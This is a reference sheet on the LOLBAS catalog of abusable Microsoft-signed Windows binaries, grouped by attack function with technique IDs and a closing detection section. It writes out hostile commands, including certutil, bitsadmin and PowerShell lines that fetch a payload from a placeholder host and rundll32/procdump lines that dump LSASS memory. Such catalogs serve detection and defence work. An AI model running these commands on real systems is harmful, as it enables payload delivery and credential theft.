# LOLBAS: Living Off the Land Binaries, Scripts, and Libraries — Complete Reference

## Overview
LOLBAS is a curated catalog of Microsoft-signed binaries, scripts, and libraries that can be abused by adversaries for malicious purposes. These tools are trusted by default due to their Microsoft signature, making them effective for defense evasion.

Source: https://lolbas-project.github.io

## Common Abuse Functions

### AWL Bypass (Application Whitelisting Bypass)
Using Microsoft-signed binaries to bypass application control solutions like AppLocker or WDAC.

### Download
Using trusted binaries to download remote payloads, bypassing network security controls.

### Execute
Running arbitrary code (EXE, DLL, script) through a trusted binary.

### UAC Bypass
Elevating privileges from admin to SYSTEM without triggering UAC prompts.

### Dump
Extracting credentials from memory (LSASS) or other sources.

### Copy/Upload
Exfiltrating data using built-in file transfer mechanisms.

## Critical LOLBins by Function

### Execution
- **rundll32.exe** — Execute DLLs, JavaScript, or COM objects (T1218.011)
- **regsvr32.exe** — Register/unregister DLLs, load remote SCT files (T1218.010)
- **mshta.exe** — Execute HTA files or inline JavaScript (T1218.005)
- **wmic.exe** — Execute processes locally or remotely (T1047, T1218)
- **msiexec.exe** — Install MSI packages, execute DLLs (T1218.007)
- **cscript.exe / wscript.exe** — Execute VBScript/JavaScript (T1218)
- **powershell.exe** — Full scripting and execution capability (T1059.001)
- **bitsadmin.exe** — Download/upload files via BITS (T1197)
- **certutil.exe** — Download files, encode/decode payloads (T1105)
- **hh.exe** — Execute CHM files containing embedded scripts (T1218.001)
- **cmstp.exe** — Execute INF files for bypass (T1218.003)

### Download
- **certutil.exe** — `certutil -urlcache -f http://host/payload.exe payload.exe`
- **bitsadmin.exe** — `bitsadmin /transfer job /download /priority high http://host/payload.exe`
- **powershell.exe** — `Invoke-WebRequest -Uri http://host/payload.exe -OutFile payload.exe`
- **curl.exe** — Native Windows curl
- **desktopimgdownldr.exe** — Download images from URLs
- **expand.exe** — Download and expand CAB files
- **finger.exe** — Download via finger protocol
- **ieexec.exe** — .NET execution and download
- **mshta.exe** — Inline download via HTA

### Credential Dumping / LSASS Access
- **comsvcs.dll** — `rundll32.exe comsvcs.dll,MiniDump <PID> lsass.dmp full`
- **procdump.exe** — `procdump.exe -ma lsass.exe lsass.dmp`
- **sqldumper.exe** — Can be abused for process dumping
- **rdrleakdiag.exe** — Memory leak diagnostic, can dump process memory
- **createdump.exe** — .NET Core crash dumper, can be abused
- **adplus.exe** — Debugging tool for process dumps

### UAC Bypass
- **eventvwr.exe** — Bypasses UAC by launching elevated commands
- **computerdefaults.exe** — Bypasses UAC via auto-elevation
- **fodhelper.exe** — Bypasses UAC via registry modifications
- **wsreset.exe** — Bypasses UAC via auto-elevation
- **iscsicpl.exe** — Bypasses UAC via DLL sideloading

### Data Exfiltration / Copy
- **robocopy.exe** — Robust file copy for large-scale data theft
- **xcopy.exe** — Legacy file copy tool
- **esentutl.exe** — Database utilities for copying locked files
- **makecab.exe** — Compress and copy files
- **print.exe** — Copy file to printer or device
- **replace.exe** — Replace (copy) files

### Reconnaissance
- **ping.exe** — Network connectivity checks
- **nslookup.exe** — DNS resolution and exfiltration
- **net.exe** — User, group, and network enumeration
- **systeminfo.exe** — System configuration enumeration
- **tasklist.exe** — Process enumeration
- **qprocess.exe / query.exe** — Session and process queries
- **wevtutil.exe** — Event log enumeration and clearing

## Detection Approach
LOLBin abuse is detected through behavioral indicators, not binary signatures:
1. **Command-line arguments** — Suspicious flags (/s, /i with URLs)
2. **Parent-child process relationships** — Office app spawning cmd.exe
3. **Network connections** — Trusted binary connecting to unknown IPs
4. **File locations** — Loading DLLs from user-writable paths
5. **Multi-instance execution** — Same LOLBin spawning rapidly
6. **Pipeline chaining** — Multiple LOLBins chained in a single execution
